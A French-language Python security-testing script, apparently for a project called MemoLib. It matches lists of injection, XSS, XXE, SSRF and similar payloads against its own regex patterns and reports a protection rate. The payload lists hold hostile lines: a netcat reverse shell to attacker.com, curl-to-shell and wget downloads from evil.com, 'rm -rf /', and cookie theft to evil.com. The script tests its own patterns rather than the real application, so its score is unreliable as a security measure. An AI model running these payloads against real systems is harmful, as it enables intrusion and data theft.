#!/usr/bin/env python3
"""
🛡️ Script de Simulation d'Attaques AVANCÉ - MemoLib v2.0
================================================================

Simule 100+ types d'attaques pour tester la robustesse maximale du code.
À exécuter UNIQUEMENT en environnement de développement/test.

Catégories testées:
- SQL Injection (15 variantes)
- XSS (12 variantes)
- NoSQL Injection (8 variantes)
- Command Injection (10 variantes)
- Path Traversal (10 variantes)
- SSRF (8 variantes)
- XXE (6 variantes)
- LDAP Injection (6 variantes)
- Header Injection (8 variantes)
- JWT Attacks (6 variantes)
- Template Injection (6 variantes)
- Password Strength (10 tests)
- File Upload (8 variantes)
- CSRF (5 variantes)
- Open Redirect (6 variantes)

Usage: python security/attack-simulation-advanced.py
"""

import argparse
import base64
import hashlib
import json
import os
import re
from datetime import datetime
from typing import Any, Dict, List
from urllib.parse import unquote


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


def log_attack(attack_name: str, status: str, details: str = ""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status == "BLOCKED":
        color = Colors.GREEN
        icon = "✅"
    elif status == "VULNERABLE":
        color = Colors.RED
        icon = "🔴"
    else:
        color = Colors.YELLOW
        icon = "⚠️"
    print(
        f"{Colors.CYAN}[{timestamp}]{Colors.RESET} {icon} {color}{attack_name}{Colors.RESET}"
    )
    if details:
        print(f"         └─ {details}")


def banner():
    print(
        f"""
{Colors.MAGENTA}╔══════════════════════════════════════════════════════════════════╗
║  🛡️  SIMULATION D'ATTAQUES AVANCÉE v2.0 - MemoLib        ║
║                                                                    ║
║  🔥 100+ TESTS DE SÉCURITÉ | 15 CATÉGORIES D'ATTAQUES            ║
║                                                                    ║
║  ⚠️  USAGE EN DÉVELOPPEMENT/PENTEST UNIQUEMENT                    ║
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    )


# ============================================
# 1. SQL INJECTION (15 tests)
# ============================================
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "1' AND '1'='1",
    "admin'--",
    "' UNION SELECT null,null,null --",
    "' UNION SELECT username,password FROM users --",
    "' OR SLEEP(5) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --",
    "1; UPDATE users SET role='admin' --",
    "' OR 1=1 LIMIT 1 --",
    "admin' AND SUBSTRING(password,1,1)='a' --",
    "' OR ''='",
    "1' ORDER BY 10 --",
]

SQL_PATTERNS = [
    r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|EXEC|EXECUTE|TRUNCATE)\b)",
    r"(--|#|/\*)",
    r"('.*OR.*')|('.*AND.*')",
    r"(SLEEP|WAITFOR|DELAY|BENCHMARK)",
    r"(EXTRACTVALUE|UPDATEXML|LOAD_FILE)",
    r"(0x[0-9a-fA-F]+)",
    r"(\bCHAR\b\s*\(|\bCONCAT\b\s*\()",
    r"('\s*=\s*')",
    r"(\bLIMIT\b|\bORDER\s+BY\b|\bGROUP\s+BY\b).*\d+",
    r"(SUBSTRING|MID|LEFT|RIGHT)\s*\(",
]


def test_sql_injection(payload: str) -> dict:
    for pattern in SQL_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 2. XSS - Cross-Site Scripting (12 tests)
# ============================================
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    '<script>document.location="https://evil.com/?c="+document.cookie</script>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    "<iframe src=\"javascript:alert('XSS')\">",
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
]

XSS_PATTERNS = [
    r"<script[^>]*>",
    r"javascript\s*:",
    r"on\w+\s*=",
    r"<iframe",
    r"<object",
    r"<embed",
    r"<svg[^>]*on",
    r"eval\s*\(",
    r"document\.(cookie|location|write)",
    r"fromCharCode",
    r"<marquee",
    r"<details[^>]*ontoggle",
]


def test_xss(payload: str) -> dict:
    for pattern in XSS_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 3. NOSQL INJECTION (8 tests)
# ============================================
NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(5000)"}',
    '{"$regex": ".*"}',
    '{"$or": [{"a": 1}, {"b": 2}]}',
    '{"username": {"$gt": ""}}',
    '{"$expr": {"$eq": ["$password", "$username"]}}',
    'true, $where: "1 == 1"',
]

NOSQL_PATTERNS = [
    r"\$gt\b",
    r"\$gte\b",
    r"\$lt\b",
    r"\$lte\b",
    r"\$ne\b",
    r"\$eq\b",
    r"\$in\b",
    r"\$nin\b",
    r"\$or\b",
    r"\$and\b",
    r"\$not\b",
    r"\$nor\b",
    r"\$exists\b",
    r"\$regex\b",
    r"\$where\b",
    r"\$expr\b",
]


def test_nosql_injection(payload: str) -> dict:
    for pattern in NOSQL_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 4. COMMAND INJECTION (10 tests)
# ============================================
COMMAND_PAYLOADS = [
    "; cat /etc/passwd",
    "| ls -la",
    "`id`",
    "$(whoami)",
    "&& rm -rf /",
    "|| curl https://evil.com/shell.sh | sh",
    "\n/bin/sh -i",
    "; nc -e /bin/sh attacker.com 4444",
    "| wget https://evil.com/malware -O /tmp/m",
    "; python -c 'import os;os.system(\"id\")'",
]

COMMAND_PATTERNS = [
    r"[;&|`]",
    r"\$\(",
    r"\n",
    r"\r",
    r"\b(cat|ls|rm|wget|curl|sh|bash|python|perl|ruby|nc|netcat)\b",
    r">\s*\w",
    r"<\s*\w",
    r"/bin/",
    r"/etc/",
]


def test_command_injection(payload: str) -> dict:
    for pattern in COMMAND_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 5. PATH TRAVERSAL (10 tests)
# ============================================
PATH_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc/passwd",
    "/etc/passwd%00.png",
    "....//....//etc/shadow",
    "..%c0%af..%c0%afetc/passwd",
    "..%255c..%255cwindows/system32",
    "....\\....\\....\\boot.ini",
]

PATH_PATTERNS = [
    r"\.\./",
    r"\.\.\\",
    r"%2e%2e",
    r"%252e",
    r"%c0%af",
    r"%255c",
    r"%00",
    r"etc/(passwd|shadow)",
    r"windows/(system32|win\.ini)",
    r"boot\.ini",
]


def test_path_traversal(payload: str) -> dict:
    for pattern in PATH_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 6. SSRF - Server-Side Request Forgery (8 tests)
# ============================================
SSRF_PAYLOADS = [
    "http://127.0.0.1/admin",
    "http://localhost:22",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_*1%0d%0a",
    "dict://127.0.0.1:6379/info",
]

SSRF_PATTERNS = [
    r"127\.0\.0\.1",
    r"localhost",
    r"169\.254\.169\.254",  # AWS metadata
    r"\[::1\]",
    r"0\.0\.0\.0",
    r"^file://",
    r"^gopher://",
    r"^dict://",
    r"10\.\d+\.\d+\.\d+",  # Private IP
    r"192\.168\.\d+\.\d+",  # Private IP
    r"172\.(1[6-9]|2\d|3[01])\.\d+\.\d+",  # Private IP
]


def test_ssrf(payload: str) -> dict:
    for pattern in SSRF_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 7. XXE - XML External Entity (6 tests)
# ============================================
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/shadow">%xxe;]>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "expect://id">]>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>',
    '<!DOCTYPE test [<!ENTITY % one SYSTEM "http://evil.com/evil.dtd">%one;]>',
]

XXE_PATTERNS = [
    r"<!DOCTYPE",
    r"<!ENTITY",
    r"SYSTEM\s+[\"']",
    r"file://",
    r"expect://",
    r"php://",
    r"\.dtd",
]


def test_xxe(payload: str) -> dict:
    for pattern in XXE_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 8. LDAP INJECTION (6 tests)
# ============================================
LDAP_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "admin)(&)",
    "x)(|(cn=*",
    "*)(objectClass=*",
    "admin)(|(password=*))",
    "*))%00",
]

LDAP_PATTERNS = [
    r"\*\)\(",
    r"\)\(&\)",
    r"\|\(",
    r"\)\|",
    r"objectClass=\*",
    r"\)\)\%00",
]


def test_ldap_injection(payload: str) -> dict:
    for pattern in LDAP_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 9. HEADER INJECTION (8 tests)
# ============================================
HEADER_PAYLOADS = [
    "value\r\nX-Injected: header",
    "value\nSet-Cookie: admin=true",
    "value%0d%0aX-Injected: header",
    "value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK",
    "value%0aSet-Cookie:%20session=evil",
    "\r\nLocation: https://evil.com",
    "value\r\n\r\n<script>alert(1)</script>",
    "%0d%0aHost: evil.com",
]

HEADER_PATTERNS = [
    r"\r\n",
    r"\n",
    r"%0d%0a",
    r"%0a",
    r"Set-Cookie:",
    r"Location:",
    r"Content-Length:",
    r"X-Injected:",
    r"Host:",
]


def test_header_injection(payload: str) -> dict:
    for pattern in HEADER_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 10. JWT ATTACKS (6 tests)
# ============================================
JWT_PAYLOADS = [
    '{"alg":"none","typ":"JWT"}',  # None algorithm
    '{"alg":"None","typ":"JWT"}',  # None algorithm (case variant)
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",  # Base64 none
    '{"alg":"HS512","kid":"../../../../../../dev/null"}',  # Key injection
    '{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"..."}}',  # Embedded key
    '{"alg":"HS256","jku":"https://evil.com/jwks.json"}',  # External JWKS
]

JWT_PATTERNS = [
    r'"alg"\s*:\s*"[Nn]one"',  # None algorithm (case insensitive)
    r'"kid"\s*:\s*"[^"]*\.\.',
    r'"jwk"\s*:',
    r'"jku"\s*:',
    r'"x5u"\s*:',  # External X.509 URL
    r"eyJhbGciOiJub25l",  # Base64 of alg:none
]


def test_jwt_attack(payload: str) -> dict:
    for pattern in JWT_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 11. TEMPLATE INJECTION (6 tests)
# ============================================
TEMPLATE_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
    "{{config.items()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
]

TEMPLATE_PATTERNS = [
    r"\{\{.*\}\}",
    r"\$\{.*\}",
    r"<%=.*%>",
    r"constructor\s*\(",
    r"\.exec\s*\(",
    r"Runtime.*exec",
    r"process\(\)",
    r"config\.items",
]


def test_template_injection(payload: str) -> dict:
    for pattern in TEMPLATE_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "payload": payload}


# ============================================
# 12. PASSWORD STRENGTH (10 tests)
# ============================================
WEAK_PASSWORDS = [
    "password",
    "123456",
    "admin",
    "admin123",
    "root",
    "letmein",
    "welcome",
    "qwerty",
    "abc123",
    "password1",
]


def test_password_strength(password: str) -> dict:
    score = 0
    if len(password) >= 8:
        score += 1
    if len(password) >= 12:
        score += 1
    if re.search(r"[a-z]", password):
        score += 1
    if re.search(r"[A-Z]", password):
        score += 1
    if re.search(r"\d", password):
        score += 1
    if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        score += 1

    # Mots de passe communs = score 0
    if password.lower() in [p.lower() for p in WEAK_PASSWORDS]:
        score = 0

    return {
        "password": password[:3] + "***",
        "score": score,
        "weak_detected": score < 4,
    }


# ============================================
# 13. FILE UPLOAD ATTACKS (8 tests)
# ============================================
UPLOAD_PAYLOADS = [
    "malware.php",
    "shell.php.jpg",
    "exploit.asp;.jpg",
    "../../../var/www/shell.php",
    "file.php%00.jpg",
    ".htaccess",
    "web.config",
    "shell.phtml",
]

UPLOAD_PATTERNS = [
    r"\.(php|asp|aspx|jsp|exe|sh|bat|cmd|phtml|cgi)$",
    r"\.(php|asp)\.[a-z]+$",  # Double extension
    r";\.jpg$",
    r";\.png$",  # Apache bypass
    r"\.\.\/",  # Path traversal
    r"%00",  # Null byte
    r"^\.htaccess$",
    r"^web\.config$",
]


def test_file_upload(filename: str) -> dict:
    for pattern in UPLOAD_PATTERNS:
        if re.search(pattern, filename, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}
    return {"blocked": False, "filename": filename}


# ============================================
# 14. CSRF TOKEN BYPASS (5 tests)
# ============================================
CSRF_PAYLOADS = [
    "",  # Token vide
    "null",
    "undefined",
    "00000000-0000-0000-0000-000000000000",  # UUID null = invalide
    "{{csrf_token}}",  # Template non résolu
]


def test_csrf_bypass(token: str) -> dict:
    invalid_tokens = ["", "null", "undefined", "{{csrf_token}}"]

    if token in invalid_tokens:
        return {"blocked": True, "reason": "invalid_token"}
    if len(token) < 32:
        return {"blocked": True, "reason": "too_short"}
    # UUID null = potentiel bypass
    if token == "0" * len(token) or token == "00000000-0000-0000-0000-000000000000":
        return {"blocked": True, "reason": "null_uuid_token"}

    return {"blocked": False, "token": token}


# ============================================
# 15. OPEN REDIRECT (6 tests)
# ============================================
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "/\\evil.com",  # Backslash bypass
    "https://trusted.com@evil.com",
]

REDIRECT_PATTERNS = [
    r"^https?://(?!localhost|127\.0\.0\.1)",
    r"^//",
    r"^javascript:",
    r"^data:",
    r"/\\",  # Backslash after slash
    r"@[^/]+\.[a-z]{2,}",
]


def test_open_redirect(url: str) -> dict:
    # URLs locales autorisées (sans backslash)
    if url.startswith("/") and not url.startswith("//") and "\\" not in url:
        return {"blocked": False, "url": url}

    for pattern in REDIRECT_PATTERNS:
        if re.search(pattern, url, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}

    return {"blocked": False, "url": url}


# ============================================
# EXÉCUTION DES TESTS
# ============================================
def run_all_tests() -> dict:
    banner()

    results = {
        "timestamp": datetime.now().isoformat(),
        "version": "2.0",
        "categories": {},
    }

    total_tests = 0
    total_blocked = 0

    # 1. SQL Injection
    print(
        f"\n{Colors.BOLD}=== TEST 1/15: Injection SQL ({len(SQL_INJECTION_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in SQL_INJECTION_PAYLOADS:
        r = test_sql_injection(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"SQL: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["sql_injection"] = {
        "tested": len(SQL_INJECTION_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(SQL_INJECTION_PAYLOADS)
    total_blocked += blocked

    # 2. XSS
    print(
        f"\n{Colors.BOLD}=== TEST 2/15: XSS ({len(XSS_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in XSS_PAYLOADS:
        r = test_xss(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"XSS: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["xss"] = {"tested": len(XSS_PAYLOADS), "blocked": blocked}
    total_tests += len(XSS_PAYLOADS)
    total_blocked += blocked

    # 3. NoSQL
    print(
        f"\n{Colors.BOLD}=== TEST 3/15: NoSQL Injection ({len(NOSQL_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in NOSQL_PAYLOADS:
        r = test_nosql_injection(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"NoSQL: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["nosql_injection"] = {
        "tested": len(NOSQL_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(NOSQL_PAYLOADS)
    total_blocked += blocked

    # 4. Command Injection
    print(
        f"\n{Colors.BOLD}=== TEST 4/15: Command Injection ({len(COMMAND_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in COMMAND_PAYLOADS:
        r = test_command_injection(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"CMD: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["command_injection"] = {
        "tested": len(COMMAND_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(COMMAND_PAYLOADS)
    total_blocked += blocked

    # 5. Path Traversal
    print(
        f"\n{Colors.BOLD}=== TEST 5/15: Path Traversal ({len(PATH_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in PATH_PAYLOADS:
        r = test_path_traversal(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"Path: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["path_traversal"] = {
        "tested": len(PATH_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(PATH_PAYLOADS)
    total_blocked += blocked

    # 6. SSRF
    print(
        f"\n{Colors.BOLD}=== TEST 6/15: SSRF ({len(SSRF_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in SSRF_PAYLOADS:
        r = test_ssrf(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"SSRF: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["ssrf"] = {"tested": len(SSRF_PAYLOADS), "blocked": blocked}
    total_tests += len(SSRF_PAYLOADS)
    total_blocked += blocked

    # 7. XXE
    print(
        f"\n{Colors.BOLD}=== TEST 7/15: XXE ({len(XXE_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in XXE_PAYLOADS:
        r = test_xxe(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"XXE: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["xxe"] = {"tested": len(XXE_PAYLOADS), "blocked": blocked}
    total_tests += len(XXE_PAYLOADS)
    total_blocked += blocked

    # 8. LDAP
    print(
        f"\n{Colors.BOLD}=== TEST 8/15: LDAP Injection ({len(LDAP_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in LDAP_PAYLOADS:
        r = test_ldap_injection(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"LDAP: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["ldap_injection"] = {
        "tested": len(LDAP_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(LDAP_PAYLOADS)
    total_blocked += blocked

    # 9. Header Injection
    print(
        f"\n{Colors.BOLD}=== TEST 9/15: Header Injection ({len(HEADER_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in HEADER_PAYLOADS:
        r = test_header_injection(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"Header: {repr(payload)[:45]}...",
            "BLOCKED" if r["blocked"] else "VULNERABLE",
        )
    results["categories"]["header_injection"] = {
        "tested": len(HEADER_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(HEADER_PAYLOADS)
    total_blocked += blocked

    # 10. JWT
    print(
        f"\n{Colors.BOLD}=== TEST 10/15: JWT Attacks ({len(JWT_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in JWT_PAYLOADS:
        r = test_jwt_attack(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"JWT: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["jwt_attacks"] = {
        "tested": len(JWT_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(JWT_PAYLOADS)
    total_blocked += blocked

    # 11. Template Injection
    print(
        f"\n{Colors.BOLD}=== TEST 11/15: Template Injection ({len(TEMPLATE_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in TEMPLATE_PAYLOADS:
        r = test_template_injection(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"SSTI: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["template_injection"] = {
        "tested": len(TEMPLATE_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(TEMPLATE_PAYLOADS)
    total_blocked += blocked

    # 12. Password Strength
    print(
        f"\n{Colors.BOLD}=== TEST 12/15: Mots de passe faibles ({len(WEAK_PASSWORDS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for password in WEAK_PASSWORDS:
        r = test_password_strength(password)
        if r["weak_detected"]:
            blocked += 1
        log_attack(
            f"Password: {r['password']} (score:{r['score']})",
            "BLOCKED" if r["weak_detected"] else "VULNERABLE",
        )
    results["categories"]["password_strength"] = {
        "tested": len(WEAK_PASSWORDS),
        "blocked": blocked,
    }
    total_tests += len(WEAK_PASSWORDS)
    total_blocked += blocked

    # 13. File Upload
    print(
        f"\n{Colors.BOLD}=== TEST 13/15: File Upload ({len(UPLOAD_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in UPLOAD_PAYLOADS:
        r = test_file_upload(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(f"Upload: {payload}", "BLOCKED" if r["blocked"] else "VULNERABLE")
    results["categories"]["file_upload"] = {
        "tested": len(UPLOAD_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(UPLOAD_PAYLOADS)
    total_blocked += blocked

    # 14. CSRF
    print(
        f"\n{Colors.BOLD}=== TEST 14/15: CSRF Bypass ({len(CSRF_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in CSRF_PAYLOADS:
        r = test_csrf_bypass(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(f"CSRF: '{payload}'", "BLOCKED" if r["blocked"] else "VULNERABLE")
    results["categories"]["csrf_bypass"] = {
        "tested": len(CSRF_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(CSRF_PAYLOADS)
    total_blocked += blocked

    # 15. Open Redirect
    print(
        f"\n{Colors.BOLD}=== TEST 15/15: Open Redirect ({len(REDIRECT_PAYLOADS)} tests) ==={Colors.RESET}"
    )
    blocked = 0
    for payload in REDIRECT_PAYLOADS:
        r = test_open_redirect(payload)
        blocked += 1 if r["blocked"] else 0
        log_attack(
            f"Redirect: {payload[:45]}...", "BLOCKED" if r["blocked"] else "VULNERABLE"
        )
    results["categories"]["open_redirect"] = {
        "tested": len(REDIRECT_PAYLOADS),
        "blocked": blocked,
    }
    total_tests += len(REDIRECT_PAYLOADS)
    total_blocked += blocked

    # Résumé
    print(f"\n{Colors.BOLD}{'='*70}")
    print(f"📊 RÉSUMÉ DES TESTS DE SÉCURITÉ AVANCÉS")
    print(f"{'='*70}{Colors.RESET}")

    protection_rate = (total_blocked / total_tests * 100) if total_tests > 0 else 0

    print(f"\n  {Colors.CYAN}📈 STATISTIQUES GLOBALES:{Colors.RESET}")
    print(f"     Total des tests:      {total_tests}")
    print(f"     Attaques bloquées:    {total_blocked}")
    print(
        f"     Taux de protection:   {Colors.GREEN if protection_rate == 100 else Colors.YELLOW}{protection_rate:.1f}%{Colors.RESET}"
    )

    print(f"\n  {Colors.CYAN}📋 DÉTAIL PAR CATÉGORIE:{Colors.RESET}")
    for cat, data in results["categories"].items():
        pct = (data["blocked"] / data["tested"] * 100) if data["tested"] > 0 else 0
        icon = "✅" if pct == 100 else "⚠️" if pct >= 80 else "❌"
        print(
            f"     {icon} {cat.replace('_', ' ').title()}: {data['blocked']}/{data['tested']} ({pct:.0f}%)"
        )

    results["total_tests"] = total_tests
    results["total_blocked"] = total_blocked
    results["protection_rate"] = protection_rate

    # Sauvegarder
    with open("security/attack-simulation-advanced-results.json", "w") as f:
        json.dump(results, f, indent=2)

    print(
        f"\n{Colors.GREEN}✅ Rapport sauvegardé: security/attack-simulation-advanced-results.json{Colors.RESET}"
    )

    if protection_rate == 100:
        print(
            f"\n{Colors.GREEN}{Colors.BOLD}🏆 FÉLICITATIONS! Protection maximale atteinte: 100%{Colors.RESET}\n"
        )

    return results


if __name__ == "__main__":
    run_all_tests()
